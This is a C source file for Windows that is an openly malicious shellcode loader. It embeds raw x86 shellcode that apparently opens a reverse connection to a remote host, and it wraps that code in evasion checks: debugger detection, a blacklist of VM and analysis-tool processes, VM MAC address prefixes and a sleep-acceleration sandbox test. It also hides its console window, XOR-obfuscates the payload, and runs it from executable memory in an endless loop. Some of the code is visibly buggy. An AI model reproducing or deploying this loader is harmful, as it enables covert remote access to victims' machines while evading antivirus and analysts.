#include "main.h"

int bypass_av();

int run_shellcode();
void xor_cipher(char* shellcode);
void decrypt_shellcode(char* shellcode);
void spam_nops();

int enumarate_process();
int check_process_running(TCHAR process_name);
TCHAR GetProcessNameAndID(DWORD processID);

int check_sleep_acceleration();
int get_current_time();

char get_mac_address();
int checks_mac_address();
//

LPVOID lpvAddr;
HANDLE hHand;
DWORD dwWaitResult;

char process_blacklist[PROCESS_BLACKLIST_MAX][PROCESS_NAME_MAX] = {
    "vmsrvc",
    "tcpview",
    "wireshark",
    "visual basic",
    "fiddler",
    "vmware",
    "vbox",
    "process explorer",
    "autoit",
    "vboxtray",
    "vmtools",
    "vmrawdsk",
    "vmusbmouse",
    "vmvss",
    "vmscsi",
    "vmxnet",
    "vmx_svga",
    "vmmemctl",
    "df5serv",
    "vboxservice",
    "vmhgfs",
    "vmtoolsd"
};

char macs_blacklist[MACS_MAX][MACS_LENGTH_MAX] = {
    "080027",
    "000569",
    "000C29",
    "001C14",
    "005056",
    "001C42",
    "00163E",
    "0A0027"
};


unsigned char shellcode[] =
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
    "\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
    "\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x6a"
    "\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
    "\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
    "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
    "\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
    "\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
    "\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
    "\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
    "\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
    "\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
    "\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
    "\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";


//

int bypass_av(){
    if ( IsDebuggerPresent() ){
        return -1;
    }

    if ( enumarate_process() == -1){
        return -1;
    }

    if ( check_sleep_acceleration() == -1 ){
        return -1;
    }

    if ( checks_mac_address() == -1 ){
        return -1;
    }

    return 0;

}

// Checks if any process in blacklist are running in the system


int check_process_running(TCHAR process_name){
    unsigned int x;

    for (x = 0; x < PROCESS_BLACKLIST_MAX; x++){
        if ( strcmp(process_name,process_blacklist[x] ) == 0 ){
            return -1;
        }
    }    
}

TCHAR GetProcessNameAndID(DWORD processID){
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

    // Get a handle to the process.

    HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION |
                                   PROCESS_VM_READ,
                                   FALSE, processID );

    // Get the process name.

    if (NULL != hProcess )
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
        {
            GetModuleBaseName( hProcess, hMod, szProcessName, 
                               sizeof(szProcessName)/sizeof(TCHAR) );
        }
    }

    // Print the process name and identifier.

    _tprintf( TEXT("%s  (PID: %u)\n"), szProcessName, processID );

    // Release the handle to the process.

    CloseHandle( hProcess );    

    return szProcessName;
}


int enumarate_process(){
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i,x;

    if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
    {
        return 1;
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.

    for ( i = 0; i < cProcesses; i++ )
    {
        if( aProcesses[i] != 0 )
        {
            TCHAR process_name[MAX_PATH];
            strcpy(process_name,GetProcessNameAndID( aProcesses[i] )); // Gets process name
            if( check_process_running(process_name) == -1) { // Checks if the process are running in the system, if the return value is -1, returns false and closes the program.
                return -1;
            }
        }
    }

    return 0;    
}


///////////////////////////////////////////////////////



// If a sandbox is running, the "Sleep" will be accelerated

int check_sleep_acceleration(){
    int first_time, second_time;

    first_time = get_current_time();
    Sleep(60000);

    second_time = get_current_time();

    if ( (first_time - second_time) < 60000){
        return -1;
    }

    return 0;
}



int get_current_time(){
    time_t rawtime;
    struct tm * timeinfo;
    time( &rawtime );
    timeinfo = localtime( &rawtime );
    return timeinfo->tm_min;
}


/////////////////////////////////////////////////////////


// Checks if the mac address is the same as default VM's mac


char get_mac_address(){
    FILE* fp;
    char command[] = "getmac";
    char mac_address[17];
    char final_mac_address[12];

    fp = popen(command, "r"); // Runs "getmac" command
    fgets(mac_address,sizeof(mac_address),fp); // Gets the command result

    
    // Remove all :

    char * token = strtok(mac_address, ":");

    while ( token != NULL ){
        strcat(final_mac_address,token); 
        token = strtok(NULL, ":");
    }

    ///

    return final_mac_address;
}


int checks_mac_address(){
    char mac_address[12];
    strcpy(mac_address,get_mac_address());
    int i;

    for ( i = 0; i < MACS_MAX; i++ ){
        if ( strstr(mac_address,macs_blacklist[i]) != NULL ){
            return -1;
        }
    }

    return 0;
}




///////////////////////////////////////////////////////////


int run_shellcode(){

    int virtualfree_result;

    spam_nops();

    xor_cipher(&shellcode);
    // DWORD threadID;

    
    lpvAddr = VirtualAlloc(NULL, sizeof(shellcode) ,0x3000, 0x40); // Allocates memory space in the process to inject the shellcode
    
    if (lpvAddr == NULL){
        return -1;
    }
    
    RtlMoveMemory(lpvAddr, shellcode, sizeof(shellcode)); // Writes the shellcode in the memory
    // hHand = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpvAddr,NULL,0,&threadID);
    hHand = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpvAddr,NULL,0,0); // Creates the thread and runs the shellcode
    
    if (hHand == NULL){
        return -1;
    }
    
    dwWaitResult = WaitForSingleObject(hHand,INFINITE); // Waits the thread finalize

    if (dwWaitResult == 0xFFFFFFFF){
        return -1;
    }

    virtualfree_result = VirtualFree(lpvAddr, sizeof(shellcode), MEM_RELEASE); // Frees the memory space allocated before
    if (virtualfree_result == 0){
        return -1;
    }

    memset(&lpvAddr, 0x0, sizeof(lpvAddr));
    memset(&hHand, 0x0, sizeof(hHand));
    memset(&dwWaitResult, 0x0, sizeof(dwWaitResult));

    return 0;    
}

void xor_cipher(char* shellcode){
    int i;
    for (i=0; i<sizeof(shellcode); i++){
        __asm(
            "PUSH %EAX;"
            "XOR %EAX, %EAX;"
            "JZ True1;"
        
        "True1:"
            "POP %EAX;"
        );
        spam_nops();
        shellcode[i] ^= key[i % sizeof(key)];
    }
    return;
}




void spam_nops(){
    // Spawm NOP(NO OPERATION) signals

    __asm(
        "nop;"
        "nop;"
        "nop;"
        "nop;"
        "nop;"
        "nop;"
        "nop;"
        "nop;"
        "nop;"
        "nop;"
        "nop;"
    );
    return;
}

int main(){

    // Hide the terminal 

    int result;

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    spam_nops();


    xor_cipher(&shellcode); // Encrypts the shellcode

    if (bypass_av() != 0){
        return 0;
    }

    xor_cipher(&shellcode); // Decrypts the shellcode

    while (1){


        result = run_shellcode();

        if (result == 0){
            Sleep(300000); // Sleeps 5 minutes before re-run shellcode
            spam_nops();
        }
    
    }

    return 0;
}
